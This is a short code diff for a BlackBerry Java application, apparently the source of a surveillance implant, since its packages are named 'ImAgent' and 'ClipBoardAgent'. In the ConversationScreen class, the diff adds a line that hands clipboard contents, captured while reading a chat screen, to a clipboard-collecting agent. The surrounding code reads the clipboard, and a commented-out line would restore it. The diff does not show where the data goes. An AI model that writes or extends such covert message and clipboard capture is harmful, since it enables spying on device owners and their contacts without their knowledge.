@@ -16,6 +16,7 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.agent.ClipBoardAgent;
 import blackberry.agent.ImAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -126,6 +127,8 @@ public class ConversationScreen {
                 screen, true)) {
 
             clip = (String) Clipboard.getClipboard().get();
+            ClipBoardAgent.getInstance().setClip(clip);
+            
             try {
                 //Clipboard.getClipboard().put(before);
             } catch (Exception ex) {
